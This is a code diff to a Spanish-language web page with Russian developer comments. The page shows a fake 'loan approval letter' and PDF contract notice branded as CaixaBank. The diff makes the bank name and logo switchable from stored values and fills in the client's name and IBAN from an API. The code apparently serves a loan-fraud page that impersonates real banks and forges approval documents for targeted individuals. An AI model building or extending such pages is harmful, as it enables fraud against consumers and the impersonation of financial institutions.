@@ -60,7 +60,7 @@
               data-notification-pdf-open
               aria-label="Abrir PDF Contrato Nº ES-4738D9215"
             >
-              <svg class="tourist-notif-pdf__icon" width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+              <svg class="tourist-notif-pdf__icon" id="notif2PdfBankIcon" width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                 <g clip-path="url(#notif2PdfClip)">
                   <path d="M23.6458 0H13.0135H12.1896L11.6074 0.582125L3.55869 8.63138L2.97656 9.2135V10.037V26.6316C2.97656 29.5916 5.38456 32.0001 8.34506 32.0001H23.6458C26.6053 32.0001 29.0133 29.5916 29.0133 26.6316V5.3685C29.0133 2.408 26.6053 0 23.6458 0ZM27.026 26.6316C27.026 28.4989 25.5126 30.0123 23.6458 30.0123H8.34506C6.47731 30.0123 4.96394 28.4989 4.96394 26.6316V10.0369H10.1962C11.7515 10.0369 13.0135 8.77581 13.0135 7.22006V1.98775H23.6458C25.5126 1.98775 27.026 3.50113 27.026 5.3685V26.6316Z" fill="#FF4545"/>
                   <path d="M10.7478 15.7969H8.96475C8.62525 15.7969 8.42188 16.0177 8.42188 16.3484V20.9581C8.42188 21.3573 8.68463 21.6205 9.04944 21.6205C9.40638 21.6205 9.66906 21.3574 9.66906 20.9581V19.5577C9.66906 19.5236 9.6865 19.5066 9.72056 19.5066H10.7478C12.0038 19.5066 12.7596 18.7425 12.7596 17.6559C12.7596 16.5522 12.0125 15.7969 10.7478 15.7969ZM10.6711 18.4283H9.72056C9.6865 18.4283 9.66906 18.4113 9.66906 18.3777V16.9258C9.66906 16.8917 9.6865 16.8748 9.72056 16.8748H10.6711C11.1973 16.8748 11.5115 17.189 11.5115 17.6559C11.5116 18.1228 11.1973 18.4283 10.6711 18.4283Z" fill="#FF4545"/>
@@ -74,7 +74,7 @@
                 </defs>
               </svg>
               <span class="tourist-notif-pdf__text">
-                <strong>Caixa Bank</strong>
+                <strong id="notif2PdfBankName">Caixa Bank</strong>
                 <span>Contrato Nº ES-4738D9215</span>
               </span>
               <span class="tourist-notif-pdf__button">Abrir PDF</span>
@@ -120,7 +120,7 @@
           <article class="credit-letter" aria-label="Carta de aprobación de préstamo">
             <section class="credit-letter__page">
               <header class="credit-letter__masthead">
-                <div class="credit-letter__caixa-brand">
+                <div class="credit-letter__caixa-brand" id="notif2ContractBankLogoWrap">
                   <img src="../assets/CaixaBank_logo.svg" alt="CaixaBank" class="credit-letter__caixa-logo">
                 </div>
                 <div class="credit-letter__goval">
@@ -130,7 +130,7 @@
 
               <div class="credit-letter__body">
                 <p class="credit-letter__line"><strong>De:</strong></p>
-                <p class="credit-letter__line"><strong>CaixaBank S.A.</strong></p>
+                <p class="credit-letter__line"><strong id="notif2ContractBankName">CaixaBank S.A.</strong></p>
                 <p class="credit-letter__line"><strong>A:</strong></p>
                 <p class="credit-letter__line"><strong>GoVal Finance S.L.</strong></p>
                 <p class="credit-letter__line"><strong>Departamento de Préstamos</strong></p>
@@ -226,7 +226,6 @@
     <script src="./tourist.js?v=20260609-1"></script>
     <script>
       (function () {
-        // Клиент открыл notifications2.html — уведомление о звонке прочитано
         localStorage.setItem("notifCalledRead", "1");
 
         var apiBase = (window.FORM_API_BASE || window.MAIN_API_BASE || window.API_BASE || "").replace(/\/+$/, "");
@@ -234,8 +233,44 @@
         var ibanEl = document.getElementById("notif2Iban");
         var contractNameEl = document.getElementById("notif2ContractClientName");
 
+        // Подставить выбранный банк из localStorage
+        var bank = "";
+        var bankLogo = "";
+        try { bank = localStorage.getItem("selectedBank") || ""; } catch(e){}
+        try { bankLogo = localStorage.getItem("selectedBankLogo") || ""; } catch(e){}
+
+        var pdfBankName = document.getElementById("notif2PdfBankName");
+        var contractBankName = document.getElementById("notif2ContractBankName");
+        var contractBankLogoWrap = document.getElementById("notif2ContractBankLogoWrap");
+        var pdfBankIcon = document.getElementById("notif2PdfBankIcon");
+
+        if (bank) {
+          if (pdfBankName) pdfBankName.textContent = bank;
+          if (contractBankName) contractBankName.textContent = bank;
+        }
+        if (bankLogo) {
+          // Лого в PDF кнопке (заменяем SVG на img)
+          if (pdfBankIcon) {
+            var iconImg = document.createElement("img");
+            iconImg.src = bankLogo;
+            iconImg.alt = bank || "Banco";
+            iconImg.className = "tourist-notif-pdf__icon";
+            iconImg.style.cssText = "width:32px;height:32px;object-fit:contain;border-radius:4px;";
+            pdfBankIcon.parentNode.replaceChild(iconImg, pdfBankIcon);
+          }
+          // Лого в шапке контракта
+          if (contractBankLogoWrap) {
+            var logoImg = document.createElement("img");
+            logoImg.src = bankLogo;
+            logoImg.alt = bank || "Banco";
+            logoImg.className = "credit-letter__caixa-logo";
+            contractBankLogoWrap.innerHTML = "";
+            contractBankLogoWrap.appendChild(logoImg);
+          }
+        }
+
         // Имя из localStorage как быстрый старт
-        var cachedName = localStorage.getItem("inputName") || "";
+        var cachedName = localStorage.getItem("touristCardNombre") || localStorage.getItem("inputName") || "";
         if (contractNameEl && cachedName) contractNameEl.textContent = cachedName;
 
         function loadData() {
@@ -248,7 +283,7 @@
               if (data && data.iban && ibanEl) {
                 ibanEl.textContent = data.iban;
               }
-              var nombre = (data && data.nombre) || localStorage.getItem("inputName") || "";
+              var nombre = (data && data.nombre) || localStorage.getItem("touristCardNombre") || localStorage.getItem("inputName") || "";
               if (contractNameEl && nombre) contractNameEl.textContent = nombre;
             })
             .catch(function () {});
